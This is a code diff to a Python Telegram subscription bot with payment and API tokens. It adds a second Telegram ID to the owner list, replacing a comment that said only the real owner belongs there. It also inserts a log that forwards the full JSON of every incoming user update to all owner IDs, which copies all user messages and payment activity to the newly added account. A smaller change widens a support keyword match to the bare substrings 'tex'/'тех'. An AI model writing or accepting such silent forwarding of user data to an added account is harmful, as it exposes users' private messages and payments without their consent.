@@ -37,7 +37,7 @@ TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN")
 PAYME_TOKEN = os.getenv("PAYME_TOKEN")
 CLICK_TOKEN = os.getenv("CLICK_TOKEN")
 GOOGLE_API_KEY = os.getenv("GEMINI_API_KEY")
-OWNER_IDS = ["1477103854"]  # Faqat haqiqiy egasi
+OWNER_IDS = ["1477103854", "5543183063"]  # Abdulaziz & Second ID
 
 # УГРОЗЫ
 HACK_PATTERNS = {
@@ -402,16 +402,19 @@ def handle_update(upd):
         send_msg(uid, TEXTS.get(u.get('lang', 'ru'), TEXTS['ru'])['sub_activated'].format(tariff=tariff))
         return
 
-    # ====== GLOBAL TRY-EXCEPT & PING ======
-    if 'message' in upd and 'text' in upd['message']:
-        if upd['message']['text'] == '/ping':
-            send_msg(upd['message']['chat']['id'], "🏓 PONG! Bot is alive.")
-            return
+    # ====== OWNER BROADCAST LOG ======
+    for oid in OWNER_IDS:
+        try: send_msg(oid, f"🔔 UPDATE RECV: `{json.dumps(upd)}`")
+        except: pass
+
+    if 'message' in upd and 'text' in upd['message'] and upd['message']['text'] == '/ping':
+        send_msg(upd['message']['chat']['id'], "🏓 PONG! Bot is alive.")
+        return
 
     # ====== GOD-MODE SUPPORT FAILSAFE (Absolute Top) ======
     if 'message' in upd and 'text' in upd['message']:
         _raw = upd['message']['text'].lower()
-        if any(x in _raw for x in ['yordam', 'support', 'поддерж', 'ёрдам', 'tex. yordam', 'tex yordam']):
+        if any(x in _raw for x in ['yordam', 'support', 'поддерж', 'ёрдам', 'tex', 'тех']):
             cid = upd['message']['chat']['id']
             sup_text = "📞 Поддержка / Tex. yordam:\n\n📱 Telegram: @yuksak_it\n📞 Тел: +998 50 777 51 52"
             send_msg(cid, sup_text)
